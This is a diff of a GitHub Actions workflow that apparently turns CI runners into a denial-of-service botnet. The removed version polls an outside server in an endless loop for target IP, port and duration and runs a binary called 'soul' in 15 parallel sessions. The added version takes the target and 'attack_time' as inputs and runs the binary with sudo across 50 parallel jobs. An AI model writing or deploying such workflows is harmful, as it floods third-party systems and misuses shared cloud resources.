@@ -1,50 +1,27 @@
-name: Poll and Execute Soul
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '0 0 * * *'  # Restart daily at 5:30 AM IST
+    inputs:
+      ip:
+        description: 'Target IP'
+        required: true
+      port:
+        description: 'Port'
+        required: true
+      attack_time:
+        description: 'Time'
+        required: true
 
 jobs:
-  execute-soulcracks:
+  soul:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        session: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]
-      max-parallel: 15
-      fail-fast: false
+        n: [1,2,3,4,5,6,7,8,9,10,
+            11,12,13,14,15,16,17,18,19,20,
+            21,22,23,24,25,26,27,28,29,30,
+            31,32,33,34,35,36,37,38,39,40,
+            41,42,43,44,45,46,47,48,49,50]
     steps:
-      - uses: actions/checkout@v4
-      - name: Debug directory structure
-        run: |
-          echo "Listing repository contents:"
-          ls -la
-          echo "Checking for soulcracks binary:"
-          find . -name soul || echo "soul binary not found"
-      - name: Make binary executable
-        run: |
-          if [ -f soul ]; then
-            chmod +x soul
-            echo "Set permissions for soul"
-          else
-            echo "Error: soulcracks binary not found"
-            exit 1
-          fi
-      - name: Poll API and execute soul
-        run: |
-          echo "Session ${{ matrix.session }} polling..."
-          while true; do
-            RESPONSE=$(curl -s -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" https://galaxyshop.tech/daksh/check-attack.php)
-            EXECUTE=$(echo $RESPONSE | jq -r '.execute')
-            IP=$(echo $RESPONSE | jq -r '.ip')
-            PORT=$(echo $RESPONSE | jq -r '.port')
-            TIME=$(echo $RESPONSE | jq -r '.duration')
-            if [ "$EXECUTE" = "true" ]; then
-              echo "Session ${{ matrix.session }} executing soul..."
-              ./soul "$IP" "$PORT" "$TIME"
-              echo "Session ${{ matrix.session }} done"
-            else
-              echo "Session ${{ matrix.session }} waiting..."
-            fi
-            sleep 10
-          done
+      - uses: actions/checkout@v3
+      - run: chmod +x *
+      - run: sudo ./soul ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.attack_time }}
